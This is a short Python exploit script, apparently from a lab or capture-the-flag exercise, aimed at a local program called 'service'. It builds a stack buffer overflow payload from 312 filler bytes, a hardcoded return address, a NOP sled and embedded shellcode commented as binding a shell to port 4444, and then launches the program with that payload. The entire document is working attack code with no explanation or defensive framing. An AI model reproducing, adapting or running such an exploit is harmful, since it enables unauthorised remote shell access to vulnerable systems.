#!/usr/bin/env python
import struct
from subprocess import call

#stack address for shellcode
stack_addr = 0xbffff1d0

#bind shell to port 4444
shellcode = "\xBA\xAE\xCE\xAE\xEF\xAE\xEE\xBE\xCE\xAE\xED\xEE\xEA\xED\xCE\xAE\xCA\xDD\xCE\xAE\xAE\x8B\xEF\xAD\xDE\xAE\x0D\x05\xC1\x1E\x44\x44\xD0\x02\xFE\x16\x7E\xA0\x16\x73\x59\xB0\x02\xEB\xAF\xEC\x00\x1E\xCC\x08\xED\xEC\xCA\xBD\xCF\xDA\xDD\xAD\xDE\xEA\xEA\xA0\x16\x9E\xA0\x16\x93\x61\xEB\xED\xEB\xCF\xDE\xCE\xEC\xEC\xAD\xDC\xED\xEB\xBE\xDE\xED\xEF\xEC\xAD\xDC\x08\x0C\xAE\xCF\xDB\xAC\xEA\xEA\xA0\x16\xBE\xA0\x16\xB3\x63\xEB\xED\xEB\xCF\xDE\xCE\xCE\xC0\x08\x0C\xAA\xCC\xE4\xCF\xDA\xDD\xAD\xDE\xFA\xEA\xEA\xA0\x16\xCE\xA0\x16\xC3\x64\xEB\xED\xEB\xCF\xDE\xCE\xCE\xCE\xDE\xDE\xDE\xEE\x00\x80\xEE\xAE\xCE\xCF\xED\xEC\xCA\xD2\xED\xEC\xDD\xAD\xDE\xC0\x3D\xEA\xA0\xFE\xDE\xCD\xEC\xEC\x08\x0C\xEC\xDA\xBE\xEC\xEE\xCA\xDE\xDA\xE0\xAE\xAE\xAE\xA0\x68\x73\x2F\x2F\x06\xE6\x96\x22\xFE\xBE\xEB\xEA\xED\xBA\x00\xB0\x80"

#endianess convertion
def conv(num):
    return struct.pack("<I",num)

buff = "A" * 312        #filler
buff += conv(stack_addr)#address for shellcode  
buff += "\x90" * 100    #NOP
buff += shellcode # shellcode for binding


call(["./service", buff])

